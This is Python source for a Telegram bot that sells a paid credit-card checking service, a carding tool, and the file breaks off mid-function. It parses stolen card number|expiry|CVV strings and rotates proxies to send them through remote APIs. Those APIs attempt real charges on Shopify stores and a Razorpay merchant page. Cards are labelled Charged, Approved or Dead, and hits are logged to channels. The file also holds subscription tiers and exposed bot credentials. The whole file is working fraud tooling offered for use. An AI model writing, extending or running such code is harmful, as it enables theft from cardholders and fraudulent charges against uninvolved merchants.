from telethon import TelegramClient, events, Button
from telethon.errors import UserNotParticipantError, FloodWaitError
from telethon.tl.functions.channels import GetParticipantRequest
from urllib.parse import quote, quote_plus
import asyncio
import aiohttp
import aiofiles
import os
import sys
import random
import time
import json
import re
import string
from datetime import datetime, timedelta

# Ensure /data directory exists
os.makedirs('/data', exist_ok=True)

# ====================== CONFIGURATION ======================
API_ID = 39896832
API_HASH = '8cf6e687a04efbe1ecd8b24232229ea0'
BOT_TOKEN = '8758918414:AAGb9sOtnwE_KJXL8XzW-2zE9u6tGiiAt9c'

# Updated Admin IDs 
ADMIN_ID = [8484228345 , 8347557279]

# Updated Channel Links
LOGS_CHANNEL = "https://t.me/limcalogs"
CHECKING_CHANNEL = "https://t.me/+CDZj7uyOt1kzZjll"
UPDATES_CHANNEL = "https://t.me/limcapvtgc"
PVT_LIMCA_CHANNEL = "https://t.me/+lGdREm6OkPg0NDY1"

# Free Group Link (Updated)
GROUP_LINK = 'https://t.me/limca_chking_grp'

# ====================== NEW API ENDPOINTS ======================
# Updated Shopify API URL
CHECKER_API_URL = 'https://web-production-3d364.up.railway.app/shopify'
# Updated Razorpay API URL
RAZORPAY_API_URL = 'https://razorpay-api-production-bc64.up.railway.app/razorpay'
RAZORPAY_MERCHANT_URL = 'https://razorpay.me/@mstechnomedia'

# ====================== RAZORPAY MERCHANT URL PERSISTENCE ======================
RZ_URL_FILE = '/data/rz_url.txt'

def load_rz_merchant_url():
    if os.path.exists(RZ_URL_FILE):
        try:
            with open(RZ_URL_FILE, 'r') as f:
                url = f.read().strip()
            if url:
                return url
        except Exception:
            pass
    return RAZORPAY_MERCHANT_URL

def save_rz_merchant_url(url):
    with open(RZ_URL_FILE, 'w') as f:
        f.write(url.strip())

# ====================== SINGLE INSTANCE LOCK ======================
PID_FILE = '/data/bot.pid'

def _acquire_single_instance():
    try:
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
    except:
        pass
    with open(PID_FILE, 'w') as f:
        f.write(str(os.getpid()))
    import atexit
    def _cleanup():
        try:
            os.remove(PID_FILE)
        except OSError:
            pass
    atexit.register(_cleanup)

_acquire_single_instance()

# ====================== FILE PATHS ======================
PREMIUM_USERS_FILE = "/data/premium_users.txt"
SITES_FILE = '/data/sites.txt'
PROXY_FILE = '/data/proxy.txt'
CODES_FILE = '/data/codes.json'
USERS_FILE = '/data/users.json'

# ====================== DEFAULT SITES ======================
DEFAULT_SITES = [
    "https://keyesco.myshopify.com",
    "https://customsbyarrillc.myshopify.com",
]

# Ensure sites.txt exists with default sites
if not os.path.exists(SITES_FILE):
    with open(SITES_FILE, 'w') as f:
        f.write('\n'.join(DEFAULT_SITES) + '\n')
    print(f"✅ Created {SITES_FILE} with {len(DEFAULT_SITES)} default sites.")
else:
    with open(SITES_FILE, 'r') as f:
        content = f.read().strip()
    if not content:
        with open(SITES_FILE, 'w') as f:
            f.write('\n'.join(DEFAULT_SITES) + '\n')
        print(f"✅ sites.txt was empty, populated with {len(DEFAULT_SITES)} default sites.")

# ====================== PLANS ======================
PLANS = {
    'FREE':     {'price': 'Free', 'days': 30,  'cc_limit': 100,  'emoji': '🆓', 'group_only': True},
    'BASIC':    {'price': '$5',   'days': 15,  'cc_limit': 500,  'emoji': '🥉', 'group_only': False},
    'STANDARD': {'price': '$10',  'days': 15,  'cc_limit': 1000, 'emoji': '🥈', 'group_only': False},
    'PREMIUM':  {'price': '$15',  'days': 30,  'cc_limit': 2000, 'emoji': '🥇', 'group_only': False},
    'VIP':      {'price': '$20',  'days': 30,  'cc_limit': 5000, 'emoji': '👑', 'group_only': False},
}

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions = {}
pending_addsites = {}
pending_sitecheck = {}
user_active_check = {}
current_proxy_check = {'tasks': [], 'alive_proxies': [], 'status_msg': None}

# CRITICAL fix #4: Shared HTTP session for all API calls.
# Reusing a single ClientSession enables TCP connection reuse, DNS caching,
# and SSL session resumption — eliminates the per-request connection setup
# cost that was the #1 cause of progressive slowdown in mass checks.
_shared_session = None
_shared_session_lock = asyncio.Lock()

def _shared_http_session():
    """Returns a singleton aiohttp.ClientSession. Created once, reused forever."""
    global _shared_session
    if _shared_session is None or _shared_session.closed:
        connector = aiohttp.TCPConnector(
            limit=100,           # max total connections
            limit_per_host=20,   # max connections per host
            ttl_dns_cache=300,   # DNS cache TTL (5 min)
            use_dns_cache=True,
            ssl=False,
        )
        _shared_session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=30),
            skip_auto_headers={'User-Agent'},
        )
    return _shared_session

# ====================== HIT LOG CHANNEL ======================
HIT_LOG_CHANNEL = -1003932337255

# ====================== PRIVATE FORWARD GROUP ======================
PRIVATE_FORWARD_GROUP = -1003826719155

# ====================== FEEDBACK GROUP ======================
FEEDBACK_GROUP = -1003922363281

# ====================== CHANNEL JOIN VERIFICATION ======================
VERIFIED_USERS_FILE = "/data/verified_users.txt"

def is_user_verified(user_id):
    if not os.path.exists(VERIFIED_USERS_FILE):
        return False
    try:
        with open(VERIFIED_USERS_FILE, 'r') as f:
            verified = [line.strip() for line in f if line.strip()]
        return str(user_id) in verified
    except:
        return False

def mark_user_verified(user_id):
    try:
        with open(VERIFIED_USERS_FILE, 'a') as f:
            f.write(f"{user_id}\n")
    except:
        pass

# ====================== PREMIUM EMOJIS ======================
PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "5444931419270839381", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5364052602357044385", "⭐": "5343636681473935403",
    "🆓": "5406756500108501710", "👑": "5303547611351902889", "🔍": "5258396243666681152",
    "⏱️": "5303243514782443814", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5303159080020372094", "🥰": "5881784744949062058", "😱": "5868517294618975202",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5116599934203724812", "🌳": "5305346287820895195",
    "🦉": "5123344136665039833", "🍑": "5258121851091043775", "💪": "5305622454218024328",
    "🌝": "5404494035891023578", "📁": "5447408120752013199", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5283232570660634549",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5305618829265628111",
    "📌": "5447187153274567373", "💸": "5447579253723918909",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result
async def safe_edit(message, text, **kwargs):
    try:
        return await message.edit(text, **kwargs)

    except FloodWaitError as e:
        print(f"FloodWait: {e.seconds}")

        try:
            return await message.respond(text, **kwargs)
        except:
            return None

    except Exception as e:
        print("Edit Error:", e)

        try:
            return await message.respond(text, **kwargs)
        except:
            return None

# ====================== HELPERS ======================
def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return []

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def save_sites(sites):
    with open(SITES_FILE, 'w') as f:
        f.write('\n'.join(sites) + '\n')

# ====================== USER DATA ======================
def load_users_data():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}

def save_users_data(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def load_codes():
    if not os.path.exists(CODES_FILE):
        return {}
    try:
        with open(CODES_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}

def save_codes(codes):
    with open(CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=2)

def generate_key(length=16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# ====================== PLAN MANAGEMENT ======================
def assign_free_plan(user_id):
    if user_id in ADMIN_ID:
        return
    users = load_users_data()
    uid = str(user_id)
    existing = users.get(uid)
    if existing:
        try:
            exp = datetime.fromisoformat(existing['expires_at'])
            if datetime.now() < exp:
                return
        except Exception:
            pass
    plan = PLANS['FREE']
    users[uid] = {
        'plan': 'FREE',
        'expires_at': (datetime.now() + timedelta(days=plan['days'])).isoformat(),
        'cc_used': 0,
        'cc_limit': plan['cc_limit'],
        'redeemed_at': datetime.now().isoformat(),
    }
    save_users_data(users)

def is_premium(user_id):
    if user_id in ADMIN_ID:
        return True
    users = load_users_data()
    uid = str(user_id)
    if uid not in users:
        return False
    try:
        exp = datetime.fromisoformat(users[uid]['expires_at'])
        return datetime.now() < exp
    except Exception:
        return False

def can_check(user_id, is_private=True):
    if user_id in ADMIN_ID:
        return 'ok'
    users = load_users_data()
    uid = str(user_id)
    if uid not in users:
        return 'no_plan'
    data = users[uid]
    plan_key = data.get('plan', 'FREE')
    plan = PLANS.get(plan_key, PLANS['FREE'])
    try:
        if datetime.now() >= datetime.fromisoformat(data['expires_at']):
            return 'expired'
    except Exception:
        return 'expired'
    if plan.get('group_only', False) and is_private:
        return 'group_only'
    return 'ok'

def get_cc_remaining(user_id):
    if user_id in ADMIN_ID:
        return -1
    users = load_users_data()
    uid = str(user_id)
    if uid not in users:
        return 0
    try:
        exp = datetime.fromisoformat(users[uid]['expires_at'])
        if datetime.now() >= exp:
            return 0
        return users[uid]['cc_limit']
    except Exception:
        return 0

def increment_cc_used(user_id, count=1):
    if user_id in ADMIN_ID:
        return
    try:
        users = load_users_data()
        uid = str(user_id)
        if uid in users:
            users[uid]['cc_used'] = users[uid].get('cc_used', 0) + count
            save_users_data(users)
    except Exception:
        pass

# ====================== REDEEM CODE ======================
def generate_code(plan_key):
    codes = load_codes()
    for _ in range(10):
        part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        code = f"{plan_key[:3]}-{part1}-{part2}"
        if code not in codes:
            break
    codes[code] = {
        'plan': plan_key,
        'used': False,
        'used_by': None,
        'used_at': None,
        'created_at': datetime.now().isoformat(),
    }
    save_codes(codes)
    return code

def redeem_code(user_id, code):
    codes = load_codes()
    code = code.upper().strip()
    if code not in codes:
        return 'not_found', None
    if codes[code]['used']:
        return 'used', None
    plan_key = codes[code]['plan']
    plan = PLANS[plan_key]
    uid = str(user_id)
    users = load_users_data()
    if user_id not in ADMIN_ID and uid in users:
        user_data = users[uid]
        current_plan = user_data.get('plan', 'FREE')
        if current_plan != 'FREE':
            try:
                current_expiry = datetime.fromisoformat(user_data.get('expires_at', '2000-01-01'))
                if datetime.now() < current_expiry:
                    return 'already_active', None
            except:
                pass
    expires_at = datetime.now() + timedelta(days=plan['days'])
    users[uid] = {
        'plan': plan_key,
        'expires_at': expires_at.isoformat(),
        'cc_used': 0,
        'cc_limit': plan['cc_limit'],
        'redeemed_at': datetime.now().isoformat(),
    }
    save_users_data(users)
    codes[code]['used'] = True
    codes[code]['used_by'] = uid
    codes[code]['used_at'] = datetime.now().isoformat()
    save_codes(codes)
    return 'ok', {'plan_key': plan_key, 'plan': plan, 'expires_at': expires_at}

# ====================== MENU ======================
def get_main_menu_keyboard(user_id=None, is_free=False):
    if is_free:
        buttons = [
            [Button.inline("Cmd", b"show_cmds"),
             Button.url("Channel", GROUP_LINK)],
            [Button.url("Upgrade", "https://t.me/limcalogs")],
        ]
    else:
        buttons = [
            [Button.inline("Cmd", b"show_cmds"),
             Button.url("Channel", "https://t.me/limcalogs")],
            [Button.url("Upgrade", "https://t.me/limcalogs")],
        ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline("⚜ LIMCAxSIR Control Center", b"admin_panel")])
    return buttons

# ====================== CARD EXTRACTION ======================
def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

# ====================== BIN INFO ======================
async def get_bin_info(card_number):
    try:
        bin_num = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        session = _shared_http_session()
        async with session.get(f'https://bins.antipublic.cc/bins/{bin_num}') as res:
            if res.status != 200:
                return '-', '-', '-', '-', '-', ''
            data = await res.json()
            return (data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'),
                    data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', ''))
    except Exception:
        return '-', '-', '-', '-', '-', ''

# ====================== UPDATED API CHECKING ======================
async def check_card(card, site, proxy):
    try:
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            parts = proxy.split(':')
            if len(parts) == 4:
                ip, port, user, pw = parts
                proxy_str = f"{ip}:{port}:{user}:{pw}"
            elif len(parts) == 2:
                proxy_str = f"{parts[0]}:{parts[1]}"
            else:
                proxy_str = proxy

        # New API format: ?site={site}&cc={card}&proxy={proxy}
        url = f"{CHECKER_API_URL}?site={quote_plus(site)}&cc={quote_plus(card)}"

        if proxy_str:
            url += f"&proxy={quote_plus(proxy_str)}"

        timeout = aiohttp.ClientTimeout(total=30)
        session = _shared_http_session()
        # REMOVED fix #5: print("REQUEST URL:", url)
        async with session.get(url) as resp:
            # REMOVED fix #5: print("STATUS CODE:", resp.status)
            if resp.status != 200:
                return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
            try:
                text = (await resp.text()).strip()

                # REMOVED fix #5: print("=" * 50)
                # REMOVED fix #5: print("CARD:", card)
                # REMOVED fix #5: print("STATUS:", resp.status)
                # REMOVED fix #5: print("RAW:", repr(text))
                # REMOVED fix #5: print("=" * 50)

                if not text:
                    return {
                        "status": "Site Error",
                        "message": "Empty API Response",
                        "card": card,
                        "retry": True
                    }
                print("API RAW RESPONSE:", text)

                raw = json.loads(text)
            except Exception:
                return {
                    "status": "Site Error",
                    "message": f"Invalid JSON: {text[:100]}",
                    "card": card,
                    "retry": True
                }
            except Exception:
                text = await resp.text()
                return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}

        response_msg = raw.get('Response', '')
        print("API RESPONSE:", response_msg)
        price = raw.get('Price', '-')
        gateway = raw.get('Gate', raw.get('Gateway', 'Shopify'))

        if not response_msg or not gateway or gateway == "Unknown":
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        price_str = str(price)
        if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]:
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        # Check for Charged/Approved based on Response text
        response_lower = response_msg.lower()

        if any(x in response_lower for x in [
            "charged",
            "charge",
            "successful",
            "success",
            "succeeded",
            "captured",
            "capture",
            "authorized",
            "authorised",
            "payment successful",
            "payment complete",
            "order placed",
            "order completed",
            # User provided exact API response messages
            "order_placed",
            "payment_successful",
            "thank_you",
            "thank you",
            "order confirmed",
            "thank you for your order",
            "thank you for your purchase",
            "order payment received",
            "payment received",
            "order placed successfully",
            "payment processed",
            "transaction approved",
            "payment approved",
            "order processing",
            "processing your order",
            "here's what's next",
            "whats next",
            # Webhook confirmation messages
            "orders/paid",
            "order_transactions/create",
            "payment completed",
            "order fulfillment started",
            "preparing your order",
            # Post-purchase messages
            "shipping confirmation coming soon",
            "track your order",
            "order number",
            "tracking information",
            "thank you for shopping with us",
            "appreciate your business"
        ]):
            status = "Charged"
            # Add payment success messages to response
            payment_messages = [
                'Order_Placed', 'order_placed',
                'Payment_Successful', 'payment_successful',
                'Thank_You', 'thank_you', 'Thank You',
                'Order Completed 💎', 'order completed 💎',
                'Order Confirmed', 'order confirmed',
                'Thank you for your order', 'Thank you for your purchase',
                'Order payment received', 'Payment received',
                'Order placed successfully', 'Payment processed',
                'Transaction approved', 'Payment approved',
                'Order processing', 'Processing your order',
                'Whats next', "Here's what's next",
                'orders/paid', 'order_transactions/create',
                'Payment completed', 'payment completed',
                'Order fulfillment started', 'Preparing your order',
                'Shipping confirmation coming soon', 'Track your order',
                'Order number', 'Tracking information',
                'Thank you for shopping with us', 'Appreciate your business'
            ]
            return {
                'status': 'Charged',
                'message': response_msg,
                'card': card,
                'site': site,
                'gateway': gateway,
                'price': price,
                'payment_messages': payment_messages
        }

        elif any(x in response_lower for x in [
            "approved",
            "approve",
            "otp_required",
            "otp required",
            "insufficient funds",
            "insufficient_funds",
            "avs",
            "cvv",
            "3d secure",
            "authentication required"
         ]):
            status = "Approved"
            return {
                'status': 'Approved',
                'message': response_msg,
                'card': card,
                'site': site,
                'gateway': gateway,
                'price': price
        }

        else:
            return {
                'status': 'Dead',
                'message': response_msg,
                'card': card,
                'site': site,
                'gateway': gateway,
                'price': price
        }
    except Exception as e:
        return {
                'status': 'Dead',
                'message': str(e),
                'card': card,
                'gateway': 'Unknown',
                'price': '-'
         }

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    if not sites or not proxies:
        return {'status': 'Dead', 'message': 'No sites or proxies', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    last_result = None
    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        if not result.get('retry'):
            return result
        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)
    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

# ====================== UPDATED RAZORPAY CHECKER ======================
# Track dead proxies to skip them in retries (avoids wasting requests on exhausted proxies)
_dead_proxies = set()
_dead_proxy_expiry = {}
DEAD_PROXY_TTL = 300  # 5 minutes — retry dead proxies after this

def _is_proxy_dead(proxy_str):
    """Check if a proxy is marked dead and still within TTL."""
    import time as _time
    if proxy_str in _dead_proxies:
        expiry = _dead_proxy_expiry.get(proxy_str, 0)
        if _time.time() < expiry:
            return True
        else:
            # TTL expired, unmark dead
            _dead_proxies.discard(proxy_str)
            _dead_proxy_expiry.pop(proxy_str, None)
    return False

def _mark_proxy_dead(proxy_str):
    """Mark a proxy as dead for DEAD_PROXY_TTL seconds."""
    import time as _time
    _dead_proxies.add(proxy_str)
    _dead_proxy_expiry[proxy_str] = _time.time() + DEAD_PROXY_TTL

def _pick_alive_proxy(proxies):
    """Pick a random proxy that is not marked dead. Falls back to any if all are dead."""
    alive = [p for p in proxies if not _is_proxy_dead(p)]
    if alive:
        return random.choice(alive)
    # All marked dead — reset and pick any
    _dead_proxies.clear()
    _dead_proxy_expiry.clear()
    return random.choice(proxies)

async def check_razorpay(card, proxy=None, amount=None, currency=None):
    card_original = card
    try:
        proxy_str = None
        if proxy:
            parts = proxy.split(':')
            if len(parts) == 4:
                ip, port, u, p = parts
                proxy_str = f"{ip}:{port}:{u}:{p}"
            elif len(parts) == 2:
                proxy_str = f"{parts[0]}:{parts[1]}"
            else:
                proxy_str = proxy

        # New Razorpay API format: /razorpay/cc={card}
        rz_merchant = load_rz_merchant_url()
        cc, mm, yy, cvv = card.split("|")
        yy = yy[-2:]
        card = f"{cc}|{mm}|{yy}|{cvv}"

        encoded_card = quote(card, safe="")
        url = f"{RAZORPAY_API_URL}/cc={encoded_card}"

        # Build query string: proxy (if any), then amount + currency.
        amt_str = str(amount).strip() if amount is not None else '1'
        cur_str = str(currency).strip().upper() if currency else 'INR'
        if not amt_str:
            amt_str = '1'
        if not cur_str:
            cur_str = 'INR'

        query_parts = []
        if proxy_str:
            query_parts.append(f"proxy={quote_plus(proxy_str)}")
        query_parts.append(f"amount={quote_plus(amt_str)}")
        query_parts.append(f"currency={quote_plus(cur_str)}")
        if query_parts:
            url += "?" + "&".join(query_parts)

        # Build friendly price display
        _zero_decimal = {'JPY', 'KRW', 'VND', 'CLP', 'ISK', 'PYG', 'UGX', 'RWF', 'BIF', 'DJF', 'GNF', 'KMF', 'XAF', 'XOF', 'XPF'}
        _currency_symbol = {
            'INR': '₹', 'USD': '$', 'EUR': '€', 'GBP': '£', 'JPY': '¥',
            'KRW': '₩', 'AUD': 'A$', 'CAD': 'C$', 'SGD': 'S$', 'AED': 'د.إ',
            'CNY': '¥', 'CHF': 'Fr', 'RUB': '₽', 'BRL': 'R$', 'ZAR': 'R',
        }
        try:
            _amt_raw = amt_str
            if _amt_raw.endswith('p') or _amt_raw.endswith('P'):
                _amt_major = float(_amt_raw[:-1]) / 100.0
            else:
                _amt_major = float(_amt_raw)
            if cur_str in _zero_decimal:
                _amt_disp = f"{int(round(_amt_major))}"
            elif _amt_major == int(_amt_major):
                _amt_disp = f"{int(_amt_major)}"
            else:
                _amt_disp = f"{_amt_major:.2f}".rstrip('0').rstrip('.')
        except (ValueError, TypeError):
            _amt_disp = amt_str
        _symbol = _currency_symbol.get(cur_str, cur_str + ' ')
        price_display = f"{_symbol}{_amt_disp}"

        timeout = aiohttp.ClientTimeout(total=30)
        session = _shared_http_session()
        # REMOVED fix #5: print("REQUEST URL:", url)
        async with session.get(url) as resp:
            # REMOVED fix #5: print("STATUS:", resp.status)
            body = await resp.text()
            # REMOVED fix #5: print("BODY:", body)

            # Handle empty body — API returned 200 but no content
            # This happens when the API server fails silently (proxy timeout, etc.)
            if not body or not body.strip():
                if resp.status != 200:
                    return {'status': 'Dead', 'message': f'HTTP {resp.status} - Empty response', 'card': card, 'retry': True}
                return {'status': 'Dead', 'message': 'Empty API response (server error)', 'card': card, 'retry': True}

            # Parse body even on 500 — the API returns structured JSON errors
            raw = None
            try:
                raw = json.loads(body)
            except Exception:
                if resp.status != 200:
                    return {'status': 'Dead', 'message': f'HTTP {resp.status} - Invalid JSON', 'card': card, 'retry': True}
                return {'status': 'Dead', 'message': 'Invalid JSON response', 'card': card, 'retry': True}

            if resp.status != 200:
                # Extract the actual error message from the API response
                api_response = raw.get("response", "") if raw else ""
                api_status = raw.get("status", "") if raw else ""

                # Check if this is a proxy-related error
                proxy_field = raw.get("proxy", "") if raw else ""
                is_proxy_error = (
                    "Proxy quota exhausted" in api_response or
                    "DEAD" in proxy_field or
                    "Payment Required" in api_response or
                    "proxy" in api_response.lower()
                )

                if is_proxy_error and proxy_str:
                    _mark_proxy_dead(proxy_str)
                    return {
                        'status': 'Dead',
                        'message': f'Proxy Error: {api_response[:100]}',
                        'card': card,
                        'retry': True,
                        'proxy_dead': True
                    }

                # Razorpay server error — retryable but don't mark proxy dead
                if "server_error" in api_response or "server error" in api_response.lower():
                    return {
                        'status': 'Dead',
                        'message': f'Razorpay Server Error: {api_response[:100]}',
                        'card': card,
                        'retry': True
                    }

                # Other HTTP errors — retryable
                return {
                    'status': 'Dead',
                    'message': api_response or f'HTTP {resp.status}',
                    'card': card,
                    'retry': True
                }

        response_msg = raw.get("response", "")
        response_lower = response_msg.lower()
        status = raw.get("status", "")
        gateway = raw.get("gate", "Razorpay")

        # Build price display from the API's amount + currency fields.
        # The API returns the ACTUAL order currency (determined by the
        # merchant's payment link, NOT the user's requested currency).
        # So if user requested USD but the site is INR, the API returns
        # currency="INR" and we display "Rs5" (not "$5").
        _zero_decimal_api = {'JPY', 'KRW', 'VND', 'CLP', 'ISK', 'PYG', 'UGX', 'RWF', 'BIF', 'DJF', 'GNF', 'KMF', 'XAF', 'XOF', 'XPF'}
        _currency_symbol_api = {
            'INR': '\u20b9', 'USD': '$', 'EUR': '\u20ac', 'GBP': '\u00a3', 'JPY': '\u00a5',
            'KRW': '\u20a9', 'AUD': 'A$', 'CAD': 'C$', 'SGD': 'S$', 'AED': '\u062f.\u0625',
            'CNY': '\u00a5', 'CHF': 'Fr', 'RUB': '\u20bd', 'BRL': 'R$', 'ZAR': 'R',
        }
        api_amount = raw.get('amount', amt_str)
        api_currency = str(raw.get('currency', cur_str)).strip().upper() if raw.get('currency') else cur_str
        try:
            _ea_f = float(api_amount)
            if api_currency in _zero_decimal_api:
                _ea_disp = f"{int(round(_ea_f))}"
            elif _ea_f == int(_ea_f):
                _ea_disp = f"{int(_ea_f)}"
            else:
                _ea_disp = f"{_ea_f:.2f}".rstrip('0').rstrip('.')
            _ea_sym = _currency_symbol_api.get(api_currency, api_currency + ' ')
            price = f"{_ea_sym}{_ea_disp}"
        except (ValueError, TypeError):
            price = f"{api_amount} {api_currency}"
        # Update amt_str/cur_str to reflect what was ACTUALLY charged
        amt_str = str(api_amount)
        cur_str = api_currency

        # Extract currency conversion info from API response
        echo_req_amt = raw.get('requested_amount')
        echo_req_cur = str(raw.get('requested_currency', '')).strip().upper()
        echo_ex_rate = raw.get('exchange_rate', 0)
        try:
            echo_ex_rate = float(echo_ex_rate)
        except (ValueError, TypeError):
            echo_ex_rate = 0

        if not response_msg:
            return {'status': 'Dead', 'message': 'No response from API', 'card': card, 'retry': True}

        # Handle "api key provided is invalid" — config error, retry with different proxy
        if 'api key' in response_lower and 'invalid' in response_lower:
            return {'status': 'Dead', 'message': 'API key invalid (config error)', 'card': card, 'retry': True}

        # Check for Charged — match both uppercase and lowercase status from API
        if status.lower() == 'charged' or any(x in response_lower for x in [
            'charged', 'charge', 'successful', 'success', 'succeeded',
            # User provided exact API response messages
            'order_placed', 'payment_successful', 'thank_you', 'thank you',
            'order confirmed', 'thank you for your order', 'thank you for your purchase',
            'order payment received', 'payment received', 'order placed successfully',
            'payment processed', 'transaction approved', 'payment approved',
            'order processing', 'processing your order', 'here\'s what\'s next', 'whats next',
            'orders/paid', 'order_transactions/create', 'payment completed',
            'order fulfillment started', 'preparing your order',
            'shipping confirmation coming soon', 'track your order',
            'order number', 'tracking information',
            'thank you for shopping with us', 'appreciate your business'
        ]):
            # Add payment success messages
            payment_messages = [
                'Order_Placed', 'order_placed',
                'Payment_Successful', 'payment_successful',
                'Thank_You', 'thank_you', 'Thank You',
                'Order Completed 💎', 'order completed 💎',
                'Order Confirmed', 'order confirmed',
                'Thank you for your order', 'Thank you for your purchase',
                'Order payment received', 'Payment received',
                'Order placed successfully', 'Payment processed',
                'Transaction approved', 'Payment approved',
                'Order processing', 'Processing your order',
                'Whats next', "Here's what's next",
                'orders/paid', 'order_transactions/create',
                'Payment completed', 'payment completed',
                'Order fulfillment started', 'Preparing your order',
                'Shipping confirmation coming soon', 'Track your order',
                'Order number', 'Tracking information',
                'Thank you for shopping with us', 'Appreciate your business'
            ]
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'gateway': gateway, 'price': price, 'payment_messages': payment_messages, 'requested_amount': echo_req_amt if echo_req_amt is not None else amt_str, 'requested_currency': echo_req_cur if echo_req_cur else cur_str, 'exchange_rate': echo_ex_rate}
        elif status.lower() == 'approved' or 'approved' in response_msg.lower():
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': gateway, 'price': price}
        else:
            return {
                'status': 'Dead',
                'message': response_msg,
                'card': card,
                'gateway': gateway,
                'price': price, 'requested_amount': echo_req_amt if echo_req_amt is not None else amt_str, 'requested_currency': echo_req_cur if echo_req_cur else cur_str, 'exchange_rate': echo_ex_rate
            }

    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card_original, 'retry': True}

async def check_razorpay_with_retry(card, proxies, max_retries=3, amount=None, currency=None):
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
    last_result = None
    for attempt in range(max_retries):
        # Pick an alive proxy (skips known-dead ones)
        proxy = _pick_alive_proxy(proxies)
        result = await check_razorpay(card, proxy, amount=amount, currency=currency)
        if not result.get('retry'):
            return result
        last_result = result
        # If proxy was marked dead, don't wait — immediately try next proxy
        if not result.get('proxy_dead') and attempt < max_retries - 1:
            await asyncio.sleep(0.3)
    return last_result or {'status': 'Dead', 'message': 'Max retries', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

# ====================== HIT LOGGING ======================
async def log_hit_to_channel(result, hit_type, user_id, username, check_type="Mass Check"):
    if not HIT_LOG_CHANNEL:
        return
    try:
        if user_id in ADMIN_ID:
            plan_name = "👑 OWNER"
        else:
            users = load_users_data()
            plan_key = users.get(str(user_id), {}).get("plan", "FREE")
            plan = PLANS.get(plan_key, PLANS["FREE"])
            plan_name = f"{plan.get('emoji', '💎')} {plan_key}"
    except Exception:
        plan_name = "💎 UNKNOWN"
    emoji = "💎" if hit_type == "Charged" else "✅"
    log_msg = (
        f"{emoji} <b>HIT DETECTED</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
